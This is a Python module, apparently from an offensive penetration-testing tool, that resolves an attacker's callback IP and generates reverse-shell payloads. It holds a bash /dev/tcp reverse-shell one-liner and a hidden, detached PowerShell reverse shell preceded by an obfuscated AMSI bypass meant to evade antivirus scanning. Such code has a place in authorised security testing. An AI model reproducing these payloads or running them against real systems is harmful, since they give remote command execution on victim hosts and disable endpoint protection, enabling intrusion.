"""Callback-IP resolution and reverse-shell payload generators.

Pure helpers with no server state: resolve the attackbox IP reverse
shells dial back to, and render the Linux/Windows payload one-liners.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent


def _resolve_callback_ip() -> str:
    """Resolve the attackbox callback IP for reverse shell payloads.

    Priority: engagement config callback_ip > callback_interface > tun0 > wg0 > first non-lo.
    """
    # Check engagement config (simple key: value parsing — no yaml dependency)
    config_path = _PROJECT_ROOT / "engagement" / "config.yaml"
    if config_path.exists():
        try:
            text = config_path.read_text()
            for line in text.splitlines():
                line = line.strip()
                if line.startswith("#") or ":" not in line:
                    continue
                key, _, val = line.partition(":")
                val = val.strip().strip("'\"")
                if key.strip() == "callback_ip" and val:
                    return val
                if key.strip() == "callback_interface" and val:
                    ip = _ip_from_interface(val)
                    if ip:
                        return ip
        except Exception:
            pass

    # Auto-detect: tun0, wg0, then first non-loopback
    for iface in ("tun0", "wg0"):
        ip = _ip_from_interface(iface)
        if ip:
            return ip

    # Fallback: first non-loopback IPv4
    try:
        result = subprocess.run(
            ["ip", "-4", "-o", "addr", "show", "scope", "global"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            for i, p in enumerate(parts):
                if p == "inet" and i + 1 < len(parts):
                    return parts[i + 1].split("/")[0]
    except Exception:
        pass

    return "CALLBACK_IP"


def _ip_from_interface(iface: str) -> str | None:
    """Get IPv4 address from a network interface name."""
    try:
        result = subprocess.run(
            ["ip", "-4", "-o", "addr", "show", "dev", iface],
            capture_output=True,
            text=True,
            timeout=3,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            for i, p in enumerate(parts):
                if p == "inet" and i + 1 < len(parts):
                    return parts[i + 1].split("/")[0]
    except Exception:
        pass
    return None


def _linux_payload(ip: str, port: int) -> str:
    """One-liner bash reverse shell for Linux targets."""
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"


def _windows_payload(ip: str, port: int) -> str:
    """Detached PowerShell reverse shell with AMSI bypass for Windows targets.

    AMSI bypass patches amsiInitFailed via split strings + [char] casts.
    Start-Process detaches from parent so shell survives xp_cmdshell/cmd /c exit.
    """
    amsi = (
        "$a=[Ref].Assembly.GetType("
        "'System.Management.Automation.'+[char]65+'msi'+[char]85+'tils');"
        "$b=$a.GetField('a'+'msiI'+'nitF'+'ailed','NonPublic,Static');"
        "$b.SetValue($null,$true)"
    )
    ps_shell = (
        f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
        "{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
    )
    combined = f"{amsi};{ps_shell}"
    detached = (
        f"Start-Process -WindowStyle Hidden powershell -ArgumentList '-c {combined}'"
    )
    return f'powershell -c "{detached}"'

